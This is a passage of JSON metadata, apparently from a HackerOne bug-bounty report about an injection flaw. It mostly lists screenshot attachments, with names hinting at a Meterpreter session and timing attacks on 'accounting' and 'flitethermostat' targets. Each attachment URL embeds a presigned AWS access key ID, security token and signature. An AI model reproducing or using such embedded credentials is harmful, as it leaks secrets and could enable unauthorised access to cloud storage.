Injection"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":434394,"file_name":"accounting_pdf_garbage.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/394/e2d38ade19851e72263a62781b3a718953997103/accounting_pdf_garbage.png?response-content-disposition=attachment%3B%20filename%3D%22accounting_pdf_garbage.png%22%3B%20filename%2A%3DUTF-8%27%27accounting_pdf_garbage.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQQUWX32YR%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150705Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQDI60ST6nG4q4laTSFldIqSXi%2FaRkkQyutm5GwT0cJIZgIhAOZhMg3jBlju6Int%2BeeUm1aiBO7rhlrQcLIk%2Bgf6D%2BEDKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgwXNLBv9MILvVoorSoq1wOfX3WD6Q7XyleYeGc645Essao0xgUb9KvTqDMYcvHVGFjpYncM47xpmv3HMsu%2F5W1XrLh7mNNldxl0sp09zO40TE5Gv3tk2fKUJkR%2FD6XSYmqjjSQ1X8rpbrso174vGjaIUSzY97sO%2Fd37gH6ZpB7ew%2Fv3oEvinQIGLVJR0eRzLhiviACbbOMKLVbWbamWcEPt5JM%2BAi%2F9NdNl7YuEpr2x1Aba%2FQ7SrG7ebdm1DcE0lVqIqx0ztrFvl3nirCMo74N6ge1UFzEhWH44%2BFZEehSLzVwe3%2F%2FBZFO65bGyxbdcPGK84GPYyTmQ%2BjLOaldd7KqAdRhPjDfqVNtwC3oWvVdxRnK%2FoQIrzUgaia36mrU%2B9zb4%2FRhBIhVDxcpxUM1gkKjO26kCJizTpuEecHCYqUizMVCu%2BZHsHDBDtIkkSFfQ%2B2gv2sFyQKltKMSVLAEHz02kDaXPYdZgNpJpJb5mig7chRqoJheUFMk5FqS9E%2FlqeZ5JfW22b6sOCLD%2FEMKSDTLFHVl3btbPUCjyHfhmlMXnpBRHVIqKR1wYVgjD5A7%2FSBEWiHu7RrZzNRZghQJBq1L32qmueS8YHqpboqJLILIuPtnLxC99DFuXuovAM4duMqxEoPDhN0Mw3oyRiwY6pAEUCR%2BsNQPvZhxAQDP4H0mmjcS7kJOELluaCLhnFR0avdVxZaYB9x8Q%2B1vVVuMQVfHNSrjWJl4H%2Be5xJlQ6IIY3JmCIpBdpvoYal7a%2B64IuQyPvQqpHA3Ie7oP5I5O%2F9TxjNDzuk8S48F6Uu5xP3VWBG1thWt0Ez9VpERdwmSl9%2FKYIOOCQmgzrHUQhmsthA0Nah76KucMZDyOmhK8c6RFPBq%2BuQw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=015be396a3ab25418381783fa0d7e9c08cd6743eb51ffe2f056a6c10aa585dfa","file_size":16816,"type":"image/png"},{"id":434395,"file_name":"accounting_input_sanitization_fail.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/395/d886f8b57bc3e29d4b1c45484c03900af6e7f145/accounting_input_sanitization_fail.png?response-content-disposition=attachment%3B%20filename%3D%22accounting_input_sanitization_fail.png%22%3B%20filename%2A%3DUTF-8%27%27accounting_input_sanitization_fail.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQQUWX32YR%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150705Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQDI60ST6nG4q4laTSFldIqSXi%2FaRkkQyutm5GwT0cJIZgIhAOZhMg3jBlju6Int%2BeeUm1aiBO7rhlrQcLIk%2Bgf6D%2BEDKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgwXNLBv9MILvVoorSoq1wOfX3WD6Q7XyleYeGc645Essao0xgUb9KvTqDMYcvHVGFjpYncM47xpmv3HMsu%2F5W1XrLh7mNNldxl0sp09zO40TE5Gv3tk2fKUJkR%2FD6XSYmqjjSQ1X8rpbrso174vGjaIUSzY97sO%2Fd37gH6ZpB7ew%2Fv3oEvinQIGLVJR0eRzLhiviACbbOMKLVbWbamWcEPt5JM%2BAi%2F9NdNl7YuEpr2x1Aba%2FQ7SrG7ebdm1DcE0lVqIqx0ztrFvl3nirCMo74N6ge1UFzEhWH44%2BFZEehSLzVwe3%2F%2FBZFO65bGyxbdcPGK84GPYyTmQ%2BjLOaldd7KqAdRhPjDfqVNtwC3oWvVdxRnK%2FoQIrzUgaia36mrU%2B9zb4%2FRhBIhVDxcpxUM1gkKjO26kCJizTpuEecHCYqUizMVCu%2BZHsHDBDtIkkSFfQ%2B2gv2sFyQKltKMSVLAEHz02kDaXPYdZgNpJpJb5mig7chRqoJheUFMk5FqS9E%2FlqeZ5JfW22b6sOCLD%2FEMKSDTLFHVl3btbPUCjyHfhmlMXnpBRHVIqKR1wYVgjD5A7%2FSBEWiHu7RrZzNRZghQJBq1L32qmueS8YHqpboqJLILIuPtnLxC99DFuXuovAM4duMqxEoPDhN0Mw3oyRiwY6pAEUCR%2BsNQPvZhxAQDP4H0mmjcS7kJOELluaCLhnFR0avdVxZaYB9x8Q%2B1vVVuMQVfHNSrjWJl4H%2Be5xJlQ6IIY3JmCIpBdpvoYal7a%2B64IuQyPvQqpHA3Ie7oP5I5O%2F9TxjNDzuk8S48F6Uu5xP3VWBG1thWt0Ez9VpERdwmSl9%2FKYIOOCQmgzrHUQhmsthA0Nah76KucMZDyOmhK8c6RFPBq%2BuQw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=22a9dc272170824bf22fb4ff664a53f7c5c09a372fde6ffa7f94cff4320ce65d","file_size":6117,"type":"image/png"},{"id":434396,"file_name":"accounting_pdf_svg_bg.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/396/6c8b2e35ce50e09024da0757f7b4c459efbb98ff/accounting_pdf_svg_bg.png?response-content-disposition=attachment%3B%20filename%3D%22accounting_pdf_svg_bg.png%22%3B%20filename%2A%3DUTF-8%27%27accounting_pdf_svg_bg.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQQUWX32YR%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150705Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQDI60ST6nG4q4laTSFldIqSXi%2FaRkkQyutm5GwT0cJIZgIhAOZhMg3jBlju6Int%2BeeUm1aiBO7rhlrQcLIk%2Bgf6D%2BEDKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgwXNLBv9MILvVoorSoq1wOfX3WD6Q7XyleYeGc645Essao0xgUb9KvTqDMYcvHVGFjpYncM47xpmv3HMsu%2F5W1XrLh7mNNldxl0sp09zO40TE5Gv3tk2fKUJkR%2FD6XSYmqjjSQ1X8rpbrso174vGjaIUSzY97sO%2Fd37gH6ZpB7ew%2Fv3oEvinQIGLVJR0eRzLhiviACbbOMKLVbWbamWcEPt5JM%2BAi%2F9NdNl7YuEpr2x1Aba%2FQ7SrG7ebdm1DcE0lVqIqx0ztrFvl3nirCMo74N6ge1UFzEhWH44%2BFZEehSLzVwe3%2F%2FBZFO65bGyxbdcPGK84GPYyTmQ%2BjLOaldd7KqAdRhPjDfqVNtwC3oWvVdxRnK%2FoQIrzUgaia36mrU%2B9zb4%2FRhBIhVDxcpxUM1gkKjO26kCJizTpuEecHCYqUizMVCu%2BZHsHDBDtIkkSFfQ%2B2gv2sFyQKltKMSVLAEHz02kDaXPYdZgNpJpJb5mig7chRqoJheUFMk5FqS9E%2FlqeZ5JfW22b6sOCLD%2FEMKSDTLFHVl3btbPUCjyHfhmlMXnpBRHVIqKR1wYVgjD5A7%2FSBEWiHu7RrZzNRZghQJBq1L32qmueS8YHqpboqJLILIuPtnLxC99DFuXuovAM4duMqxEoPDhN0Mw3oyRiwY6pAEUCR%2BsNQPvZhxAQDP4H0mmjcS7kJOELluaCLhnFR0avdVxZaYB9x8Q%2B1vVVuMQVfHNSrjWJl4H%2Be5xJlQ6IIY3JmCIpBdpvoYal7a%2B64IuQyPvQqpHA3Ie7oP5I5O%2F9TxjNDzuk8S48F6Uu5xP3VWBG1thWt0Ez9VpERdwmSl9%2FKYIOOCQmgzrHUQhmsthA0Nah76KucMZDyOmhK8c6RFPBq%2BuQw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=aab9beeeec93b2e340a1f3c7b61fd20164e6243cc17d29070b6489b8e09a9a23","file_size":102549,"type":"image/png"},{"id":434397,"file_name":"accounting_new_invoice.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/397/aaea1d6ac20214811d2c93a4121ade66ffc01f98/accounting_new_invoice.png?response-content-disposition=attachment%3B%20filename%3D%22accounting_new_invoice.png%22%3B%20filename%2A%3DUTF-8%27%27accounting_new_invoice.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQQUWX32YR%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150705Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQDI60ST6nG4q4laTSFldIqSXi%2FaRkkQyutm5GwT0cJIZgIhAOZhMg3jBlju6Int%2BeeUm1aiBO7rhlrQcLIk%2Bgf6D%2BEDKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgwXNLBv9MILvVoorSoq1wOfX3WD6Q7XyleYeGc645Essao0xgUb9KvTqDMYcvHVGFjpYncM47xpmv3HMsu%2F5W1XrLh7mNNldxl0sp09zO40TE5Gv3tk2fKUJkR%2FD6XSYmqjjSQ1X8rpbrso174vGjaIUSzY97sO%2Fd37gH6ZpB7ew%2Fv3oEvinQIGLVJR0eRzLhiviACbbOMKLVbWbamWcEPt5JM%2BAi%2F9NdNl7YuEpr2x1Aba%2FQ7SrG7ebdm1DcE0lVqIqx0ztrFvl3nirCMo74N6ge1UFzEhWH44%2BFZEehSLzVwe3%2F%2FBZFO65bGyxbdcPGK84GPYyTmQ%2BjLOaldd7KqAdRhPjDfqVNtwC3oWvVdxRnK%2FoQIrzUgaia36mrU%2B9zb4%2FRhBIhVDxcpxUM1gkKjO26kCJizTpuEecHCYqUizMVCu%2BZHsHDBDtIkkSFfQ%2B2gv2sFyQKltKMSVLAEHz02kDaXPYdZgNpJpJb5mig7chRqoJheUFMk5FqS9E%2FlqeZ5JfW22b6sOCLD%2FEMKSDTLFHVl3btbPUCjyHfhmlMXnpBRHVIqKR1wYVgjD5A7%2FSBEWiHu7RrZzNRZghQJBq1L32qmueS8YHqpboqJLILIuPtnLxC99DFuXuovAM4duMqxEoPDhN0Mw3oyRiwY6pAEUCR%2BsNQPvZhxAQDP4H0mmjcS7kJOELluaCLhnFR0avdVxZaYB9x8Q%2B1vVVuMQVfHNSrjWJl4H%2Be5xJlQ6IIY3JmCIpBdpvoYal7a%2B64IuQyPvQqpHA3Ie7oP5I5O%2F9TxjNDzuk8S48F6Uu5xP3VWBG1thWt0Ez9VpERdwmSl9%2FKYIOOCQmgzrHUQhmsthA0Nah76KucMZDyOmhK8c6RFPBq%2BuQw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=94470656d2a3e4fea534b15cd85b6edcd56ca17207838ab81b0478056ab592fc","file_size":50858,"type":"image/png"},{"id":434398,"file_name":"entry_point.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/398/e3291042cc398f37f57e5f81078ae56f100e3966/entry_point.png?response-content-disposition=attachment%3B%20filename%3D%22entry_point.png%22%3B%20filename%2A%3DUTF-8%27%27entry_point.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQQUWX32YR%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150705Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQDI60ST6nG4q4laTSFldIqSXi%2FaRkkQyutm5GwT0cJIZgIhAOZhMg3jBlju6Int%2BeeUm1aiBO7rhlrQcLIk%2Bgf6D%2BEDKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgwXNLBv9MILvVoorSoq1wOfX3WD6Q7XyleYeGc645Essao0xgUb9KvTqDMYcvHVGFjpYncM47xpmv3HMsu%2F5W1XrLh7mNNldxl0sp09zO40TE5Gv3tk2fKUJkR%2FD6XSYmqjjSQ1X8rpbrso174vGjaIUSzY97sO%2Fd37gH6ZpB7ew%2Fv3oEvinQIGLVJR0eRzLhiviACbbOMKLVbWbamWcEPt5JM%2BAi%2F9NdNl7YuEpr2x1Aba%2FQ7SrG7ebdm1DcE0lVqIqx0ztrFvl3nirCMo74N6ge1UFzEhWH44%2BFZEehSLzVwe3%2F%2FBZFO65bGyxbdcPGK84GPYyTmQ%2BjLOaldd7KqAdRhPjDfqVNtwC3oWvVdxRnK%2FoQIrzUgaia36mrU%2B9zb4%2FRhBIhVDxcpxUM1gkKjO26kCJizTpuEecHCYqUizMVCu%2BZHsHDBDtIkkSFfQ%2B2gv2sFyQKltKMSVLAEHz02kDaXPYdZgNpJpJb5mig7chRqoJheUFMk5FqS9E%2FlqeZ5JfW22b6sOCLD%2FEMKSDTLFHVl3btbPUCjyHfhmlMXnpBRHVIqKR1wYVgjD5A7%2FSBEWiHu7RrZzNRZghQJBq1L32qmueS8YHqpboqJLILIuPtnLxC99DFuXuovAM4duMqxEoPDhN0Mw3oyRiwY6pAEUCR%2BsNQPvZhxAQDP4H0mmjcS7kJOELluaCLhnFR0avdVxZaYB9x8Q%2B1vVVuMQVfHNSrjWJl4H%2Be5xJlQ6IIY3JmCIpBdpvoYal7a%2B64IuQyPvQqpHA3Ie7oP5I5O%2F9TxjNDzuk8S48F6Uu5xP3VWBG1thWt0Ez9VpERdwmSl9%2FKYIOOCQmgzrHUQhmsthA0Nah76KucMZDyOmhK8c6RFPBq%2BuQw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=907738ff286d905f55bcdc2b992f0536e9f8958f6a16a886875feb4019e1022a","file_size":935868,"type":"image/png"},{"id":434399,"file_name":"accounting_login.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/399/35e163cb24f99d57dc331ed5e51e18d4c770f246/accounting_login.png?response-content-disposition=attachment%3B%20filename%3D%22accounting_login.png%22%3B%20filename%2A%3DUTF-8%27%27accounting_login.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQQUWX32YR%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150705Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQDI60ST6nG4q4laTSFldIqSXi%2FaRkkQyutm5GwT0cJIZgIhAOZhMg3jBlju6Int%2BeeUm1aiBO7rhlrQcLIk%2Bgf6D%2BEDKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgwXNLBv9MILvVoorSoq1wOfX3WD6Q7XyleYeGc645Essao0xgUb9KvTqDMYcvHVGFjpYncM47xpmv3HMsu%2F5W1XrLh7mNNldxl0sp09zO40TE5Gv3tk2fKUJkR%2FD6XSYmqjjSQ1X8rpbrso174vGjaIUSzY97sO%2Fd37gH6ZpB7ew%2Fv3oEvinQIGLVJR0eRzLhiviACbbOMKLVbWbamWcEPt5JM%2BAi%2F9NdNl7YuEpr2x1Aba%2FQ7SrG7ebdm1DcE0lVqIqx0ztrFvl3nirCMo74N6ge1UFzEhWH44%2BFZEehSLzVwe3%2F%2FBZFO65bGyxbdcPGK84GPYyTmQ%2BjLOaldd7KqAdRhPjDfqVNtwC3oWvVdxRnK%2FoQIrzUgaia36mrU%2B9zb4%2FRhBIhVDxcpxUM1gkKjO26kCJizTpuEecHCYqUizMVCu%2BZHsHDBDtIkkSFfQ%2B2gv2sFyQKltKMSVLAEHz02kDaXPYdZgNpJpJb5mig7chRqoJheUFMk5FqS9E%2FlqeZ5JfW22b6sOCLD%2FEMKSDTLFHVl3btbPUCjyHfhmlMXnpBRHVIqKR1wYVgjD5A7%2FSBEWiHu7RrZzNRZghQJBq1L32qmueS8YHqpboqJLILIuPtnLxC99DFuXuovAM4duMqxEoPDhN0Mw3oyRiwY6pAEUCR%2BsNQPvZhxAQDP4H0mmjcS7kJOELluaCLhnFR0avdVxZaYB9x8Q%2B1vVVuMQVfHNSrjWJl4H%2Be5xJlQ6IIY3JmCIpBdpvoYal7a%2B64IuQyPvQqpHA3Ie7oP5I5O%2F9TxjNDzuk8S48F6Uu5xP3VWBG1thWt0Ez9VpERdwmSl9%2FKYIOOCQmgzrHUQhmsthA0Nah76KucMZDyOmhK8c6RFPBq%2BuQw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=df2318f982a7fc5583eca916e2f5dc151efd140520e0912e28f715cae027295f","file_size":12960,"type":"image/png"},{"id":434400,"file_name":"meterpreter_cat.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/400/00aab37ba9554ece8e0e4bbe4a89ca83211c0613/meterpreter_cat.png?response-content-disposition=attachment%3B%20filename%3D%22meterpreter_cat.png%22%3B%20filename%2A%3DUTF-8%27%27meterpreter_cat.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQQUWX32YR%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150705Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQDI60ST6nG4q4laTSFldIqSXi%2FaRkkQyutm5GwT0cJIZgIhAOZhMg3jBlju6Int%2BeeUm1aiBO7rhlrQcLIk%2Bgf6D%2BEDKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgwXNLBv9MILvVoorSoq1wOfX3WD6Q7XyleYeGc645Essao0xgUb9KvTqDMYcvHVGFjpYncM47xpmv3HMsu%2F5W1XrLh7mNNldxl0sp09zO40TE5Gv3tk2fKUJkR%2FD6XSYmqjjSQ1X8rpbrso174vGjaIUSzY97sO%2Fd37gH6ZpB7ew%2Fv3oEvinQIGLVJR0eRzLhiviACbbOMKLVbWbamWcEPt5JM%2BAi%2F9NdNl7YuEpr2x1Aba%2FQ7SrG7ebdm1DcE0lVqIqx0ztrFvl3nirCMo74N6ge1UFzEhWH44%2BFZEehSLzVwe3%2F%2FBZFO65bGyxbdcPGK84GPYyTmQ%2BjLOaldd7KqAdRhPjDfqVNtwC3oWvVdxRnK%2FoQIrzUgaia36mrU%2B9zb4%2FRhBIhVDxcpxUM1gkKjO26kCJizTpuEecHCYqUizMVCu%2BZHsHDBDtIkkSFfQ%2B2gv2sFyQKltKMSVLAEHz02kDaXPYdZgNpJpJb5mig7chRqoJheUFMk5FqS9E%2FlqeZ5JfW22b6sOCLD%2FEMKSDTLFHVl3btbPUCjyHfhmlMXnpBRHVIqKR1wYVgjD5A7%2FSBEWiHu7RrZzNRZghQJBq1L32qmueS8YHqpboqJLILIuPtnLxC99DFuXuovAM4duMqxEoPDhN0Mw3oyRiwY6pAEUCR%2BsNQPvZhxAQDP4H0mmjcS7kJOELluaCLhnFR0avdVxZaYB9x8Q%2B1vVVuMQVfHNSrjWJl4H%2Be5xJlQ6IIY3JmCIpBdpvoYal7a%2B64IuQyPvQqpHA3Ie7oP5I5O%2F9TxjNDzuk8S48F6Uu5xP3VWBG1thWt0Ez9VpERdwmSl9%2FKYIOOCQmgzrHUQhmsthA0Nah76KucMZDyOmhK8c6RFPBq%2BuQw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=3c7f0c101dbb1d030b0deabbd5afeebfcb1f1a183911213bb69a2311d10a17eb","file_size":89057,"type":"image/png"},{"id":434401,"file_name":"flitethermostat_admin.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/401/963489a2acffe6ee726811413bff196db266fc3c/flitethermostat_admin.png?response-content-disposition=attachment%3B%20filename%3D%22flitethermostat_admin.png%22%3B%20filename%2A%3DUTF-8%27%27flitethermostat_admin.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQQUWX32YR%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150705Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQDI60ST6nG4q4laTSFldIqSXi%2FaRkkQyutm5GwT0cJIZgIhAOZhMg3jBlju6Int%2BeeUm1aiBO7rhlrQcLIk%2Bgf6D%2BEDKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgwXNLBv9MILvVoorSoq1wOfX3WD6Q7XyleYeGc645Essao0xgUb9KvTqDMYcvHVGFjpYncM47xpmv3HMsu%2F5W1XrLh7mNNldxl0sp09zO40TE5Gv3tk2fKUJkR%2FD6XSYmqjjSQ1X8rpbrso174vGjaIUSzY97sO%2Fd37gH6ZpB7ew%2Fv3oEvinQIGLVJR0eRzLhiviACbbOMKLVbWbamWcEPt5JM%2BAi%2F9NdNl7YuEpr2x1Aba%2FQ7SrG7ebdm1DcE0lVqIqx0ztrFvl3nirCMo74N6ge1UFzEhWH44%2BFZEehSLzVwe3%2F%2FBZFO65bGyxbdcPGK84GPYyTmQ%2BjLOaldd7KqAdRhPjDfqVNtwC3oWvVdxRnK%2FoQIrzUgaia36mrU%2B9zb4%2FRhBIhVDxcpxUM1gkKjO26kCJizTpuEecHCYqUizMVCu%2BZHsHDBDtIkkSFfQ%2B2gv2sFyQKltKMSVLAEHz02kDaXPYdZgNpJpJb5mig7chRqoJheUFMk5FqS9E%2FlqeZ5JfW22b6sOCLD%2FEMKSDTLFHVl3btbPUCjyHfhmlMXnpBRHVIqKR1wYVgjD5A7%2FSBEWiHu7RrZzNRZghQJBq1L32qmueS8YHqpboqJLILIuPtnLxC99DFuXuovAM4duMqxEoPDhN0Mw3oyRiwY6pAEUCR%2BsNQPvZhxAQDP4H0mmjcS7kJOELluaCLhnFR0avdVxZaYB9x8Q%2B1vVVuMQVfHNSrjWJl4H%2Be5xJlQ6IIY3JmCIpBdpvoYal7a%2B64IuQyPvQqpHA3Ie7oP5I5O%2F9TxjNDzuk8S48F6Uu5xP3VWBG1thWt0Ez9VpERdwmSl9%2FKYIOOCQmgzrHUQhmsthA0Nah76KucMZDyOmhK8c6RFPBq%2BuQw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=64ad63e582081fc2f704dbd525118f8f1f10f0c989502dd99172d8762fdd24b5","file_size":41818,"type":"image/png"},{"id":434402,"file_name":"flitethermostat_timing_graph.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/402/36b532943fa10cb29e94f51114404babc1c6373b/flitethermostat_timing_graph.png?response-content-disposition=attachment%3B%20filename%3D%22flitethermostat_timing_graph.png%22%3B%20filename%2A%3DUTF-8%27%27flitethermostat_timing_graph.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQQUWX32YR%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150705Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQDI60ST6nG4q4laTSFldIqSXi%2FaRkkQyutm5GwT0cJIZgIhAOZhMg3jBlju6Int%2BeeUm1aiBO7rhlrQcLIk%2Bgf6D%2BEDKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgwXNLBv9MILvVoorSoq1wOfX3WD6Q7XyleYeGc645Essao0xgUb9KvTqDMYcvHVGFjpYncM47xpmv3HMsu%2F5W1XrLh7mNNldxl0sp09zO40TE5Gv3tk2fKUJkR%2FD6XSYmqjjSQ1X8rpbrso174vGjaIUSzY97sO%2Fd37gH6ZpB7ew%2Fv3oEvinQIGLVJR0eRzLhiviACbbOMKLVbWbamWcEPt5JM%2BAi%2F9NdNl7YuEpr2x1Aba%2FQ7SrG7ebdm1DcE0lVqIqx0ztrFvl3nirCMo74N6ge1UFzEhWH44%2BFZEehSLzVwe3%2F%2FBZFO65bGyxbdcPGK84GPYyTmQ%2BjLOaldd7KqAdRhPjDfqVNtwC3oWvVdxRnK%2FoQIrzUgaia36mrU%2B9zb4%2FRhBIhVDxcpxUM1gkKjO26kCJizTpuEecHCYqUizMVCu%2BZHsHDBDtIkkSFfQ%2B2gv2sFyQKltKMSVLAEHz02kDaXPYdZgNpJpJb5mig7chRqoJheUFMk5FqS9E%2FlqeZ5JfW22b6sOCLD%2FEMKSDTLFHVl3btbPUCjyHfhmlMXnpBRHVIqKR1wYVgjD5A7%2FSBEWiHu7RrZzNRZghQJBq1L32qmueS8YHqpboqJLILIuPtnLxC99DFuXuovAM4duMqxEoPDhN0Mw3oyRiwY6pAEUCR%2BsNQPvZhxAQDP4H0mmjcS7kJOELluaCLhnFR0avdVxZaYB9x8Q%2B1vVVuMQVfHNSrjWJl4H%2Be5xJlQ6IIY3JmCIpBdpvoYal7a%2B64IuQyPvQqpHA3Ie7oP5I5O%2F9TxjNDzuk8S48F6Uu5xP3VWBG1thWt0Ez9VpERdwmSl9%2FKYIOOCQmgzrHUQhmsthA0Nah76KucMZDyOmhK8c6RFPBq%2BuQw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=068094a91d57e7fbbba0acdb155c044f3f3f02ba2db792ca0d27d40007401a2b","file_size":8348,"type":"image/png"},{"id":434403,"file_name":"flitethermostat_login.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/403/8b0611007c1117390560362ee24485fd0de7073d/flitethermostat_login.png?response-content-disposition=attachment%3B%20filename%3D%22flitethermostat_login.png%22%3B%20filename%2A%3DUTF-8%27%27flitethermostat_login.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQQUWX32YR%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150705Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQDI60ST6nG4q4laTSFldIqSXi%2FaRkkQyutm5GwT0cJIZgIhAOZhMg3jBlju6Int%2BeeUm1aiBO7rhlrQcLIk%2Bgf6D%2BEDKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgwXNLBv9MILvVoorSoq1wOfX3WD6Q7XyleYeGc645Essao0xgUb9KvTqDMYcvHVGFjpYncM47xpmv3HMsu%2F5W1XrLh7mNNldxl0sp09zO40TE5Gv3tk2fKUJkR%2FD6XSYmqjjSQ1X8rpbrso174vGjaIUSzY97sO%2Fd37gH6ZpB7ew%2Fv3oEvinQIGLVJR0eRzLhiviACbbOMKLVbWbamWcEPt5JM%2BAi%2F9NdNl7YuEpr2x1Aba%2FQ7SrG7ebdm1DcE0lVqIqx0ztrFvl3nirCMo74N6ge1UFzEhWH44%2BFZEehSLzVwe3%2F%2FBZFO65bGyxbdcPGK84GPYyTmQ%2BjLOaldd7KqAdRhPjDfqVNtwC3oWvVdxRnK%2FoQIrzUgaia36mrU%2B9zb4%2FRhBIhVDxcpxUM1gkKjO26kCJizTpuEecHCYqUizMVCu%2BZHsHDBDtIkkSFfQ%2B2gv2sFyQKltKMSVLAEHz02kDaXPYdZgNpJpJb5mig7chRqoJheUFMk5FqS9E%2FlqeZ5JfW22b6sOCLD%2FEMKSDTLFHVl3btbPUCjyHfhmlMXnpBRHVIqKR1wYVgjD5A7%2FSBEWiHu7RrZzNRZghQJBq1L32qmueS8YHqpboqJLILIuPtnLxC99DFuXuovAM4duMqxEoPDhN0Mw3oyRiwY6pAEUCR%2BsNQPvZ